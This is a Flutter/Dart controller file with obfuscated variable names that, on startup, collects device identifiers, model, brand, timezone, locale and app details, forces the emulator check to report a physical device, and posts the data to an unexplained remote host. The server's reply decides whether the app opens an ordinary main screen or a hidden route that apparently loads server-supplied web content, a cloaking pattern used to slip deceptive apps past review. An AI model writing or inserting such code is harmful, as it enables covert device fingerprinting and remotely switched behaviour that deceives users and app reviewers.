import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var fwyxzqng = RxBool(false);
  var wguvbc = RxBool(true);
  var giqpneod = RxString("");
  var candace = RxBool(false);
  var hackett = RxBool(true);
  final mweukvpy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    zqsdjlc();
  }


  Future<void> zqsdjlc() async {

    candace.value = true;
    hackett.value = true;
    wguvbc.value = false;

    mweukvpy.post("https://bef.wavehe.xyz/afukczepjwmbtqysvr",data: await jmqbru()).then((value) {
      var jgmyu = value.data["jgmyu"] as String;
      var cspzig = value.data["cspzig"] as bool;
      if (cspzig) {
        giqpneod.value = jgmyu;
        hester();
      } else {
        schuster();
      }
    }).catchError((e) {
      wguvbc.value = true;
      hackett.value = true;
      candace.value = false;
    });
  }

  Future<Map<String, dynamic>> jmqbru() async {
    final DeviceInfoPlugin jwcy = DeviceInfoPlugin();
    PackageInfo txhjnue_rzwfb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kxtqmc = Platform.localeName;
    var ytu_GQuApS = currentTimeZone;

    var ytu_RemOKZyq = txhjnue_rzwfb.packageName;
    var ytu_QLMwoX = txhjnue_rzwfb.version;
    var ytu_VOwkTDs = txhjnue_rzwfb.buildNumber;

    var ytu_rXZfLM = txhjnue_rzwfb.appName;
    var jodyArmstrong = "";
    var arlieMann = "";
    var ytu_OM  = "";
    var ytu_blzj = "";
    var adeliaToy = "";
    var tonyHudson = "";

    var ytu_xty = "";

    var ytu_pdXEFC = "";
    var ytu_hYDoWx = false;

    if (GetPlatform.isAndroid) {
      ytu_pdXEFC = "android";
      var ausgzp = await jwcy.androidInfo;

      ytu_blzj = ausgzp.brand;

      ytu_xty  = ausgzp.model;
      ytu_OM = ausgzp.id;

      ytu_hYDoWx = ausgzp.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ytu_pdXEFC = "ios";
      var cixuls = await jwcy.iosInfo;
      ytu_blzj = cixuls.name;
      ytu_xty = cixuls.model;

      ytu_OM = cixuls.identifierForVendor ?? "";
      ytu_hYDoWx  = cixuls.isPhysicalDevice;
    }
    ytu_hYDoWx = true;
    var res = {
      "ytu_VOwkTDs": ytu_VOwkTDs,
      "ytu_xty": ytu_xty,
      "ytu_GQuApS": ytu_GQuApS,
      "ytu_hYDoWx": ytu_hYDoWx,
      "jodyArmstrong" : jodyArmstrong,
      "ytu_blzj": ytu_blzj,
      "ytu_rXZfLM": ytu_rXZfLM,
      "ytu_OM": ytu_OM,
      "ytu_QLMwoX": ytu_QLMwoX,
      "kxtqmc": kxtqmc,
      "ytu_pdXEFC": ytu_pdXEFC,
      "ytu_RemOKZyq": ytu_RemOKZyq,
      "arlieMann" : arlieMann,
      "adeliaToy" : adeliaToy,
      "tonyHudson" : tonyHudson,

    };
    return res;
  }

  Future<void> schuster() async {
    Get.offAllNamed("/xiMain");
  }

  Future<void> hester() async {
    Get.offAllNamed("/xiWay");
  }
}
